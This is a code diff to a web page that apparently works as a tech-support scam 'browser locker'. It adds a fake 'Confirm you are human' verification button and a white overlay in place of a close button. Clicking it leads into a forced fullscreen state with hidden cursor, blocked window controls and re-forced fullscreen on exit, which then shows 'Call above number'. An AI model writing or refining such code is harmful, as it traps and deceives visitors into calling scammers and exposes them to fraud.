@@ -134,66 +134,109 @@
   
   .fullscreen-active * {
     animation: disableCursorForNewElements 0.001s forwards;
+  }  /* Background overlay with modern blur effect */
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffffff;
+    z-index: 9998;
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
   }
-  /* Close button styling with blinking animation */  @keyframes blink {
-    0% { box-shadow: 0 0 15px rgba(255, 100, 100, 0.4); opacity: 0.85; }
-    50% { box-shadow: 0 0 30px rgba(255, 100, 150, 0.9); opacity: 1; }
-    100% { box-shadow: 0 0 15px rgba(255, 100, 100, 0.4); opacity: 0.85; }
+
+  /* Modern button animations */
+  @keyframes glow {
+    0% { box-shadow: 0 0 20px rgba(82, 109, 255, 0.5); }
+    50% { box-shadow: 0 0 35px rgba(82, 109, 255, 0.8); }
+    100% { box-shadow: 0 0 20px rgba(82, 109, 255, 0.5); }
   }
   
-  @keyframes pulse {
-    0% { transform: translate(250px, -200px) scale(1); }
-    50% { transform: translate(250px, -200px) scale(1.1); }
-    100% { transform: translate(250px, -200px) scale(1); }
+  @keyframes smooth-pulse {
+    0% { transform: translate(-50%, -50%) scale(1); }
+    50% { transform: translate(-50%, -50%) scale(1.02); }
+    100% { transform: translate(-50%, -50%) scale(1); }
   }
-    .close-btn {
+
+  .close-btn {
     position: fixed;
     top: 50%;
-    right: 50%;
-    transform: translate(250px, -200px);
-    width: 60px;
-    height: 60px;
-    background: linear-gradient(145deg, #ff5e3a, #ff416c);
-    border-radius: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: auto;
+    min-width: 300px;
+    height: auto;
+    padding: 20px 35px;
+    background: linear-gradient(135deg, #3a7bd5, #00d2ff);
+    border-radius: 16px;
     display: flex;
     justify-content: center;
     align-items: center;
     z-index: 9999;
     cursor: pointer;
-    animation: blink 1.5s infinite ease-in-out, pulse 3s infinite ease-in-out;
-    border: 3px solid rgba(255, 255, 255, 0.9);
-    box-shadow: 0 0 20px rgba(255, 100, 100, 0.6);
+    animation: glow 3s infinite ease-in-out, smooth-pulse 4s infinite ease-in-out;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    flex-direction: column;
   }
+
   .close-btn:hover {
-    background: linear-gradient(145deg, #ff416c, #ff5e3a);
-    animation-play-state: paused;
-    transform: translate(250px, -200px) scale(1.15);
-    box-shadow: 0 0 25px rgba(255, 100, 100, 0.8);
-  }.close-btn::before,
-  .close-btn::after {
-    content: '';
-    position: absolute;
-    width: 30px;
-    height: 4px;
-    background: white;
-    border-radius: 2px;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
-  }
-
-  .close-btn::before {
-    transform: rotate(45deg);
-  }
-
-  .close-btn::after {
-    transform: rotate(-45deg);
+    background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+    transform: translate(-50%, -50%) scale(1.03);
+    box-shadow: 0 8px 40px 0 rgba(31, 38, 135, 0.45);
+    border: 1px solid rgba(255, 255, 255, 0.3);
   }
   
-  .close-btn:hover::before,
-  .close-btn:hover::after {
-    width: 32px;
-    background: #f0f0f0;
-  }  /* Enhanced tooltip with animation */
+  /* Remove X symbol from close button */
+  .close-btn::before,
+  .close-btn::after {
+    display: none;
+  }
+    /* Modern button text styling */
+  .close-btn-text {
+    color: white;
+    font-size: 20px;
+    font-weight: 600;
+    text-align: center;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+  }
+    /* Enhanced shield icon styling */
+  .security-icon {
+    font-size: 32px;
+    margin-bottom: 15px;
+    color: white;
+    filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+    animation: floating 3s infinite ease-in-out;
+  }
+
+  @keyframes floating {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-6px); }
+    100% { transform: translateY(0px); }
+  }
+
+  /* Click indicator styling */
+  .click-indicator {
+    color: #ffd700;
+    font-size: 18px;
+    margin-top: 15px;
+    font-weight: 600;
+    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    animation: bounce 1.5s infinite ease-in-out;
+    opacity: 0.9;
+  }
+
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }/* Enhanced tooltip with animation */
   @keyframes fadeInOut {
     0% { opacity: 0; transform: translateY(10px); }
     10% { opacity: 1; transform: translateY(0); }
@@ -233,9 +276,7 @@
     0% { background: linear-gradient(145deg, #000000, #333333); }
     50% { background: linear-gradient(145deg, #222222, #000000); }
     100% { background: linear-gradient(145deg, #000000, #333333); }
-  }
-
-  .continue-btn {
+  }  .continue-btn {
     position: fixed;
     bottom: 8%;
     left: 50%;
@@ -246,17 +287,18 @@
     padding: 0 25px;
     background: linear-gradient(145deg, #000000, #333333);
     border-radius: 30px;
-    display: flex;
+    display: none;
     justify-content: center;
     align-items: center;
-    z-index: 9999;    cursor: pointer;
+    z-index: 9999;
+    cursor: pointer;
     animation: float 3s infinite ease-in-out, colorShift 5s infinite;
     border: 3px solid rgba(255, 255, 255, 0.9);
     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
     transition: all 0.3s ease;
     box-sizing: border-box;
+    right: auto;
   }
-
   .continue-btn:hover {
     transform: translateX(-50%) scale(1.05);
     box-shadow: 0 15px 30px rgba(0, 0, 0, 0.8);
@@ -295,14 +337,14 @@
     margin-left: 8px;
     animation: arrowPulse 1.5s infinite;
   }
-
-  /* Ensure the continue button stays visible even in fullscreen mode */
+  /* Show continue button only in fullscreen mode */
   .fullscreen-active .continue-btn {
     cursor: pointer !important;
+    display: flex !important;
   }
-  
-  /* Hide close button in fullscreen mode */
-  .fullscreen-active .close-btn {
+    /* Hide close button and overlay in fullscreen mode */
+  .fullscreen-active .close-btn,
+  .fullscreen-active .overlay {
     display: none !important;
   }
     /* Change the continue button text in fullscreen mode */
@@ -390,18 +432,20 @@
   /* Adjust the continue button in fullscreen mode */
 </style>
    </head>
-<body>
- <div class="top-barrier"></div>
+<body> <div class="top-barrier"></div>
  <div class="fake-header"></div>
  <div class="close-button-blocker"></div>
  <div class="window-controls-blocker"></div>
- <!-- Close Button -->
+ <!-- Overlay to hide background -->
+ <div class="overlay"></div> <!-- Close Button -->
  <div class="close-btn">
-   <span class="tooltip">Click to close</span>
+   <div class="security-icon">🛡️</div>
+   <div class="close-btn-text">Confirm you are human</div>
+   <div class="click-indicator">👆 Click here</div>
  </div>  <!-- Continue Button -->
  <div class="continue-btn">
    <span class="continue-btn-text">
-     <span class="normal-text">Continue</span>
+    <span>Continue</span>
      <span class="fullscreen-text">Call above number</span>
      <span class="arrow">→</span>
    </span>
@@ -580,6 +624,10 @@ document.addEventListener('fullscreenchange', (event) => {
               for (var i = 0; i < allElements.length; i++) {
                 allElements[i].style.cursor = 'none';
               }
+              
+              // Hide verification UI permanently
+              document.querySelector('.close-btn').style.display = 'none';
+              document.querySelector('.overlay').style.display = 'none';
               
               // Force fullscreen again if it attempts to exit
               setTimeout(function() {
